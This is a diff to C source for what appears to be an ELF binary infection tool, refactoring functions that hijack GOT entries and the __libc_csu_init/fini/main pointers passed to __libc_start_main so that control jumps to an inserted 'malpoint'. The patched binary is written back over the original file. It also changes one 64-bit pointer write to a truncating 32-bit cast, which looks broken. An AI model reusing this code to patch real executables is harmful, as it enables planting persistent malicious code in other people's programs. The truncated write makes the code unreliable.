@@ -26,7 +26,7 @@ int commit_redirect_64(Elfit_t *host, off_t location, uint64_t malpoint)
 {
     int ofd, c;
 
-    *(uint64_t *)&host->mem[location] = malpoint;
+    *(uint32_t *)&host->mem[location] = malpoint;
 
     if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode)) < 0)
     {
@@ -203,7 +203,7 @@ off_t got_redirect_64(Elfit_t *host, char *target, uint64_t *patch_addr)
     return relocptr;
 }
 
-int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint, int mode)
+off_t libc_start_main_hijack_32(Elfit_t *host, int mode, uint32_t *patch_addr)
 {
     Elf32_Ehdr *ehdr; 
     Elf32_Phdr *phdr;
@@ -234,12 +234,12 @@ int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint, int mode)
      * __libc_csu_init. This is where we'll insert our malpoint */
     pushes = 0;
     pushfound = 0;
-    if (mode == HIJACK_INIT)
-        pushestil = 4;
-    else if (mode == HIJACK_FINI)
-        pushestil = 3;
-    else if (mode == HIJACK_MAIN)
-        pushestil = 7;
+    switch(mode)
+    {
+        case HIJACK_INIT: pushestil = 4; break;
+        case HIJACK_FINI: pushestil = 3; break;
+        case HIJACK_MAIN: pushestil = 7; break;
+    }
     for(i = 0; i < MAX_SEARCH_LEN; i++)
     {
         /* pushing a register */
@@ -252,9 +252,7 @@ int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint, int mode)
         {
             if (pushes == pushestil)
             {
-                *(uint32_t *)&startoff[i+1] = malpoint;
-                printf("[+ LIBC ARG HIJACK]\tHijacking __libc_csu_%s pointer with 0x%x\n",
-                    mode == HIJACK_INIT ? "init":"fini" , malpoint);
+                *patch_addr = *(uint32_t *)&startoff[i+1];
                 pushfound = 1;
                 break;
             }
@@ -266,26 +264,11 @@ int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint, int mode)
         printf("[-] correct push instruction could not be located\n");
         return -1;
     }
-
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
-        < 0)
-    {
-        perror("tmp binary: open");
-        return -1; 
-    }
-
-    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
-    {
-        perror("tmp binary: write");
-        return -1;
-    }
-
-    rename(TMP, host->name);
     
-    return 1; 
+    return &startoff[i+1] - host->mem; 
 }
 
-int libc_start_main_hijack_64(Elfit_t *host, uint64_t malpoint, int mode)
+off_t libc_start_main_hijack_64(Elfit_t *host, int mode, uint64_t *patch_addr)
 {
     Elf64_Ehdr *ehdr; 
     Elf64_Phdr *phdr;
@@ -315,31 +298,14 @@ int libc_start_main_hijack_64(Elfit_t *host, uint64_t malpoint, int mode)
      * the 5th push we see (on 32bit) will be pushing a pointer to a to
      * __libc_csu_init. This is where we'll insert our malpoint */
 
-    if (mode == HIJACK_INIT)
-        offset = 18;
-    else if (mode == HIJACK_FINI)
-        offset = 25;
-    else if (mode == HIJACK_MAIN)
-        offset = 32;
-
-    *(uint32_t *)&startoff[offset] = malpoint;
-    printf("[+ LIBC ARG HIJACK]\tHijacking __libc_csu_%s pointer with 0x%x\n",
-        mode == HIJACK_INIT ? "init":"fini" , malpoint);
-
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
-        < 0)
+    switch(mode)
     {
-        perror("tmp binary: open");
-        return -1; 
+        case HIJACK_INIT: offset = 18; break;
+        case HIJACK_FINI: offset = 25; break;
+        case HIJACK_MAIN: offset = 32; break;
     }
 
-    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
-    {
-        perror("tmp binary: write");
-        return -1;
-    }
+    *patch_addr = *(uint32_t *)&startoff[offset];
 
-    rename(TMP, host->name);
-    
-    return 1; 
+    return &startoff[offset] - host->mem;
 }
